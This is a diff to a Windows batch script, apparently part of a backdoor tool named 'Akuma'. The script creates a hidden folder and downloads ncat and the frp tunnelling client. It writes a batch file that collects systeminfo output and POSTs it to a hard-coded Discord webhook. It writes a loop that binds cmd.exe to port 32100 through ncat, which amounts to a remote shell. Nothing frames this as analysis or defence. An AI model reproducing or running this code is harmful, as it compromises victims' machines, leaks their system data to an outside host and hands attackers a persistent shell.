@@ -3,14 +3,12 @@ rmdir /s /q %homedrive%\Akuma
 mkdir %homedrive%\Akuma
 attrib +h %homedrive%\Akuma
 cd %homedrive%\Akuma
-mkdir  %homedrive%\Akuma\ncat-portable-5.59BETA1
-curl -L https://github.com/l-urk/Akuma/raw/main/ncat.exe > ncat-portable-5.59BETA1\ncat.exe
+curl -L https://nmap.org/dist/ncat-portable-5.59BETA1.zip > ncat-portable-5.59BETA1.zip
 curl -L https://github.com/fatedier/frp/releases/download/v0.52.1/frp_0.52.1_windows_amd64.zip > frp_0.52.1_windows_amd64.zip
 echo del %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
 echo systeminfo ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
 echo curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%homedrive%\Akuma\systeminfo.txt" -F "content=zombi" https://discord.com/api/webhooks/1163478530538082437/riroyuxV8prESa8RqsYDxyLGPqksgCDMyGMwvuNxOyXkC8fzIgkvvpCUdzMU6Xlgj6Ht >> %homedrive%\Akuma\zonbi.bat
 echo :start >> %homedrive%\Akuma\ncat.bat
-echo echo y| cacls %homedrive%\Akuma\ncat-portable-5.59BETA1\ncat.exe /P everyone:f
 echo %homedrive%\Akuma\ncat-portable-5.59BETA1\ncat.exe -lvp 32100 -e cmd.exe >> %homedrive%\Akuma\ncat.bat
 echo goto start >> %homedrive%\Akuma\ncat.bat
 echo :start >> %homedrive%\Akuma\frpc.bat
